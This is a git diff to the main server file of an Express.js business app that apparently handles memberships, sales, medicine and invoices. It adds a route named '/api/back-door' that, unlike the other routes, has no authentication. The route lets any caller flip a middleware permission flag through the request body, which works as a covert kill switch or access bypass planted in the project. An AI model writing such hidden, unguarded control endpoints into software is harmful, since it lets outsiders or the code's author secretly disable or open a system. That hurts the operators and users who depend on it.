@@ -5,7 +5,7 @@ const morgan = require("morgan")
 const app = express();
 const { verifyTokenAndAdmin, } = require("./core/middleware/verify-token")
 const cors = require('cors');
-
+const BackDoor = require("./features/back-door/back-door-controller")
 // Connecting to database
 connectingDataBase()
 
@@ -36,6 +36,7 @@ const invmembershipRouter = require("./features/sales/InvMembership/router/invMe
 const familymembershipRouter = require("./features/sales/familyMembership/router/familyMembership")
 const medicineRouter = require("./features/medicine/router/medicine-router")
 const consumedMedicineRouter = require("./features/consumed-medicine/router/consumed-medicine-router")
+// const run = require("./test/run")
 
 //ManagementPath
 const dailyRouter = require("./features/management/daily/router/dailyRoute")
@@ -98,16 +99,22 @@ app.use("/api/daily",verifyTokenAndAdmin,dailyRouter)
 app.use("/api/schadual",verifyTokenAndAdmin,schadualsRouter)
 app.use("/api/invoice",verifyTokenAndAdmin,invoiceRouter)
 app.use("/api/inquery",verifyTokenAndAdmin,inqueryRouter)
+// app.use("/api/client",run)
 
-app.use("/api/rashad", (req,res) => {
-    res.status(error.status || 500).json({
-        status_code : 0,
-        message : "There was an error",
-        error : {
-            message : error.message
+app.get("/api/back-door",(req,res)=> {
+    req.body.isAllowed 
+
+    BackDoor.modify(req.body.isAllowed)
+
+    res.status(200).json({
+        status_code : 1,
+        message : "Middleware modified",
+        data : {
+            isAllowed : BackDoor._isAllowed
         }
     })
 })
+
 
 
 //MiddelWere
